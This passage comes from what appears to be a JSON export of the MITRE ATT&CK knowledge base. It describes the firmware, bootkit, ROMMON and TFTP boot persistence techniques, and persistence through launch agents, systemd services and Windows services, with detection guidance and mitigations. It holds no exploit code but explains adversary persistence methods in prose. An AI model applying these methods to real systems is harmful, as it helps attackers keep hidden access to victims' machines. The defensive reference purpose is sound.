EFI, which can be performed by API calls, and compare against known good behavior and patching.\n\nDisk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation. <a href=\"https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ITWorld Hard Disk Health Dec 2014)</a>","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Drive: Drive Modification","Network Traffic: Network Connection Creation","Process: OS API Execution","Driver: Driver Metadata","Command: Command Execution","Firmware: Firmware Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform these actions"},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc."},{"id":"M1046","name":"Boot Integrity","description":"Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. <a href=\"http://www.trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-Summary_04292008.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCG Trusted Platform Module)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Secure Boot Process)</a>"},{"id":"M1047","name":"Audit","description":"Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses."},{"id":"M1051","name":"Update Software","description":"Patch the BIOS and EFI as necessary."}],"subTechniques":[{"id":"T1542.001","name":"System Firmware","description":"Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. <a href=\"https://en.wikipedia.org/wiki/BIOS\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia BIOS)</a> <a href=\"https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia UEFI)</a> <a href=\"http://www.uefi.org/about\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: About UEFI)</a>\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.","detection":"System firmware manipulation may be detected. <a href=\"http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MITRE Trustworthy Firmware Measurement)</a> Dump and inspect BIOS images on vulnerable systems and compare against known good images. <a href=\"http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MITRE Copernicus)</a> Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.\n\nLikewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed. <a href=\"https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: McAfee CHIPSEC Blog)</a> <a href=\"https://github.com/chipsec/chipsec\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github CHIPSEC)</a> <a href=\"http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intel HackingTeam UEFI Rootkit)</a>","platforms":["Network Devices","Windows"],"dataSources":["Firmware: Firmware Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Prevent adversary access to privileged accounts or access necessary to perform this technique."},{"id":"M1046","name":"Boot Integrity","description":"Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. Use Trusted Platform Module technology. <a href=\"http://www.trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-Summary_04292008.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCG Trusted Platform Module)</a> Move system's root of trust to hardware to prevent tampering with the SPI flash memory. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET LoJax Sept 2018)</a> Technologies such as Intel Boot Guard can assist with this. <a href=\"https://www.intel.com/content/dam/www/public/us/en/documents/white-papers/security-technologies-4th-gen-core-retail-paper.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intel Hardware-based Security Technologies)</a>"},{"id":"M1051","name":"Update Software","description":"Patch the BIOS and EFI as necessary."}]},{"id":"T1542.002","name":"Component Firmware","description":"Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to System Firmware but conducted upon other system components/devices that may not have the same capability or level of integrity checking.\n\nMalicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.","detection":"Data and telemetry from use of device drivers (i.e. processes and API calls) and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology) disk monitoring may reveal malicious manipulations of components. <em>SanDisk: Self-Monitoring, Analysis and Reporting Technology (S.M.A.R.T.)</em> (link no longer available) <a href=\"https://www.smartmontools.org/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SmartMontools)</a> Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms.\n\nDisk check and forensic utilities may reveal indicators of malicious firmware such as strings, unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation. <a href=\"https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ITWorld Hard Disk Health Dec 2014)</a> Also consider comparing components, including hashes of component firmware and behavior, against known good images.","platforms":["Windows","Linux","macOS"],"dataSources":["Firmware: Firmware Modification","Process: OS API Execution","Driver: Driver Metadata"],"mitigations":[{"id":"M1051","name":"Update Software","description":"Perform regular firmware updates to mitigate risks of exploitation and/or abuse."}]},{"id":"T1542.003","name":"Bootkit","description":"Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\nIn BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR). <a href=\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant M Trends 2016)</a> The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. <a href=\"http://www.symantec.com/connect/blogs/are-mbr-infections-back-fashion\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lau 2011)</a>\n\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.\n\nIn UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code. <a href=\"https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security)</a> <a href=\"https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: welivesecurity)</a>","detection":"Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.","platforms":["Linux","Windows"],"dataSources":["Drive: Drive Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to install a bootkit."},{"id":"M1046","name":"Boot Integrity","description":"Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. <a href=\"http://www.trustedcomputinggroup.org/wp-content/uploads/Trusted-Platform-Module-Summary_04292008.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TCG Trusted Platform Module)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Secure Boot Process)</a>"}]},{"id":"T1542.004","name":"ROMMONkit","description":"Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect. <a href=\"https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Synful Knock Evolution)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>\n\n\nROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar to TFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.","detection":"There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation.","platforms":["Network Devices"],"dataSources":["Firmware: Firmware Modification"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific protocols, such as TFTP, can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific technique used by a particular adversary or tool, and will likely be different across various network configurations."},{"id":"M1046","name":"Boot Integrity","description":"Enable secure boot features to validate the digital signature of the boot environment and system image using a special purpose hardware device. If the validation check fails, the device will fail to boot preventing loading of unauthorized software. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a>"},{"id":"M1047","name":"Audit","description":"Periodically check the integrity of system image to ensure it has not been modified. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#30\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#31\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Change Control)</a>"}]},{"id":"T1542.005","name":"TFTP Boot","description":"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with Modify System Image to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to ROMMONkit and may result in the network device running a modified image. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>","detection":"Consider comparing a copy of the network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a>The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#13\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)</a>\n\nReview command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#23\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Command History)</a> Check boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#26\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Boot Information)</a> Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.","platforms":["Network Devices"],"dataSources":["Command: Command Execution","Network Traffic: Network Connection Creation","Firmware: Firmware Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Use of Authentication, Authorization, and Accounting (AAA) systems will limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. TACACS+ can keep control over which commands administrators are permitted to use through the configuration of authentication and command authorization. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#38\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - AAA)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#39\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - TACACS)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Follow vendor device hardening best practices to disable unnecessary and unused features and services, avoid using default configurations and passwords, and introduce logging and auditing for detection."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific protocols, such as TFTP, can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific technique used by a particular adversary or tool, and will likely be different across various network configurations."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Restrict use of protocols without encryption or authentication mechanisms. Limit access to administrative and management interfaces from untrusted network sources."},{"id":"M1046","name":"Boot Integrity","description":"Enable secure boot features to validate the digital signature of the boot environment and system image using a special purpose hardware device. If the validation check fails, the device will fail to boot preventing loading of unauthorized software. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#35\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Secure Boot)</a>"},{"id":"M1047","name":"Audit","description":"Periodically check the integrity of the running configuration and system image to ensure they have not been modified. <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#30\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Image File Integrity)</a> <a href=\"https://tools.cisco.com/security/center/resources/integrity_assurance.html#31\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco IOS Software Integrity Assurance - Change Control)</a>"}]}]},{"id":"T1543","name":"Create or Modify System Process","description":"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services. <a href=\"https://technet.microsoft.com/en-us/library/cc772408.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Services)</a> On macOS, launchd processes known as Launch Daemon and Launch Agent are run to finish system initialization and load user specific parameters. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppleDocs Launch Agent Daemons)</a> \n\nAdversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  \n\nServices, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges. <a href=\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Malware Detection)</a>","detection":"Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  \n\nCommand-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. \n\nMonitor for changes to files associated with system-level processes.","platforms":["Containers","Linux","macOS","Windows"],"dataSources":["Service: Service Creation","Container: Container Creation","Driver: Driver Load","Service: Service Modification","Process: Process Creation","Windows Registry: Windows Registry Key Modification","File: File Modification","File: File Creation","Windows Registry: Windows Registry Key Creation","Process: OS API Execution","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with system-level process changes and service configurations."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict read/write access to system-level process files to only select privileged users who have a legitimate need to manage system services."},{"id":"M1026","name":"Privileged Account Management","description":"Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root."},{"id":"M1028","name":"Operating System Configuration","description":"Ensure that Driver Signature Enforcement is enabled to restrict unsigned drivers from being installed."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict software installation to trusted repositories only and be cautious of orphaned software packages."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent an application from writing a signed vulnerable driver to the system. <a href=\"https://www.microsoft.com/security/blog/2021/12/08/improve-kernel-security-with-the-new-microsoft-vulnerable-and-malicious-driver-reporting-center/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malicious Driver Reporting Center)</a> On Windows 10 and 11, enable Microsoft Vulnerable Driver Blocklist to assist in hardening against third party-developed drivers. <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft driver block rules)</a>"},{"id":"M1045","name":"Code Signing","description":"Enforce registration and execution of only legitimately signed service drivers where possible."},{"id":"M1047","name":"Audit","description":"Use auditing tools capable of detecting privilege and service abuse opportunities on systems within an enterprise and correct them."},{"id":"M1054","name":"Software Configuration","description":"Where possible, consider enforcing the use of container services in rootless mode to limit the possibility of privilege escalation or malicious effects on the host running the container."}],"subTechniques":[{"id":"T1543.001","name":"Launch Agent","description":"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppleDocs Launch Agent Daemons)</a> <a href=\"https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Keydnap malware)</a> <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Antiquated Mac Malware)</a> Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. <a href=\"https://blog.malwarebytes.com/threat-analysis/2017/04/new-osx-dok-malware-intercepts-web-traffic/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX.Dok Malware)</a> Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the Launchctl command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. <a href=\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sofacy Komplex Trojan)</a> <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions. <a href=\"https://www.synack.com/wp-content/uploads/2016/03/RSA_OSX_Malware.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OSX Malware Detection)</a> <a href=\"https://www.alienvault.com/blogs/labs-research/oceanlotus-for-os-x-an-application-bundle-pretending-to-be-an-adobe-flash-update\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OceanLotus for OS X)</a>","detection":"Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.\n\nEnsure Launch Agent's <code> ProgramArguments </code> key pointing to executables located in the <code>/tmp</code> or <code>/shared</code> folders are in alignment with enterprise policy. Ensure all Launch Agents with the <code>RunAtLoad</code> key set to <code>true</code> are in alignment with policy.","platforms":["macOS"],"dataSources":["File: File Modification","Service: Service Modification","File: File Creation","Service: Service Creation","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Set group policies to restrict file permissions to the <code>~/launchagents</code> folder. <a href=\"https://antman1p-30185.medium.com/defeating-malicious-launch-persistence-156e2b40fc67\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: piazza launch agent mitigation)</a>"}]},{"id":"T1543.002","name":"Systemd Service","description":"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. Systemd is a system and service manager commonly used for managing background daemon processes (also known as services) and other system resources. <a href=\"http://man7.org/linux/man-pages/man1/systemd.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux man-pages: systemd January 2014)</a> Systemd is the default initialization (init) system on many Linux distributions replacing legacy init systems, including SysVinit and Upstart, while remaining backwards compatible.  \n\nSystemd utilizes unit configuration files with the <code>.service</code> file extension to encode information about a service's process. By default, system level unit files are stored in the <code>/systemd/system</code> directory of the root owned directories (<code>/</code>). User level unit files are stored in the <code>/systemd/user</code> directories of the user owned directories (<code>$HOME</code>). <a href=\"https://redcanary.com/blog/attck-t1501-understanding-systemd-service-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lambert systemd 2022)</a> \n\nInside the <code>.service</code> unit files, the following directives are used to execute commands: <a href=\"https://www.freedesktop.org/software/systemd/man/systemd.service.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: freedesktop systemd.service)</a>  \n\n* <code>ExecStart</code>, <code>ExecStartPre</code>, and <code>ExecStartPost</code> directives execute when a service is started manually by <code>systemctl</code> or on system start if the service is set to automatically start.\n* <code>ExecReload</code> directive executes when a service restarts. \n* <code>ExecStop</code>, <code>ExecStopPre</code>, and <code>ExecStopPost</code> directives execute when a service is stopped.  \n\nAdversaries have created new service files, altered the commands a <code>.service</code> file’s directive executes, and modified the user directive a <code>.service</code> file executes as, which could result in privilege escalation. Adversaries may also place symbolic links in these directories, enabling systemd to find these payloads regardless of where they reside on the filesystem. <a href=\"https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anomali Rocke March 2019)</a> <a href=\"http://www.ouah.org/backdoors.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: airwalk backdoor unix systems)</a> <a href=\"https://www.rapid7.com/db/modules/exploit/linux/local/service_persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rapid7 Service Persistence 22JUNE2016)</a> \n\nThe <code>.service</code> file’s User directive can be used to run service as a specific user, which could result in privilege escalation based on specific user/group permissions. \n\nSystemd services can be created via systemd generators, which support the dynamic generation of unit files. Systemd generators are small executables that run during boot or configuration reloads to dynamically create or modify systemd unit files by converting non-native configurations into services, symlinks, or drop-ins (i.e., Boot or Logon Initialization Scripts). <a href=\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Security Labs Linux Persistence 2024)</a> <a href=\"https://pberba.github.io/security/2022/02/07/linux-threat-hunting-for-persistence-systemd-generators/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pepe Berba Systemd 2022)</a>","detection":"Monitor file creation and modification events of Systemd service unit configuration files in the default directory locations for <code>root</code> &amp; <code>user</code> level permissions. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the <code>root</code> user. <a href=\"https://redcanary.com/blog/attck-t1501-understanding-systemd-service-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: lambert systemd 2022)</a> \n\nSuspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -–type=service –all</code>. Analyze the contents of <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables, and symbolic links. <a href=\"https://pberba.github.io/security/2022/01/30/linux-threat-hunting-for-persistence-systemd-timers-cron/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Berba hunting linux systemd)</a>\n\nAuditing the execution and command-line arguments of the <code>systemctl</code> utility, as well related utilities such as <code>/usr/sbin/service</code> may reveal malicious systemd service execution.","platforms":["Linux"],"dataSources":["Command: Command Execution","File: File Modification","Service: Service Creation","Service: Service Modification","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user access to system utilities such as <code>systemctl</code> to only users who have a legitimate need."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict read/write access to systemd unit files to only select privileged users who have a legitimate need to manage system services."},{"id":"M1026","name":"Privileged Account Management","description":"The creation and modification of systemd service unit files is generally reserved for administrators such as the Linux root user and other users with superuser privileges."},{"id":"M1033","name":"Limit Software Installation","description":"Restrict software installation to trusted repositories only and be cautious of orphaned software packages."}]},{"id":"T1543.003","name":"Windows Service","description":"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. <a href=\"https://technet.microsoft.com/en-us/library/cc772408.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Services)</a> Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: <code>.sys</code>) to disk, the payload can be loaded and registered via Native API functions such as <code>CreateServiceW()</code> (or manually via functions such as <code>ZwLoadDriver()</code> and <code>ZwSetValueKey()</code>), by creating the required service Registry values (i.e. Modify Registry), or by using command-line utilities such as <code>PnPUtil.exe</code>. <a href=\"https://www.wired.com/images_blogs/threatlevel/2010/11/w32_stuxnet_dossier.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec W.32 Stuxnet Dossier)</a> <a href=\"https://www.crowdstrike.com/blog/how-crowdstrike-falcon-protects-against-wiper-malware-used-in-ukraine-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike DriveSlayer February 2022)</a> <a href=\"https://unit42.paloaltonetworks.com/acidbox-rare-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit42 AcidBox June 2020)</a> Adversaries may leverage these drivers as Rootkits to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET InvisiMole June 2020)</a> <a 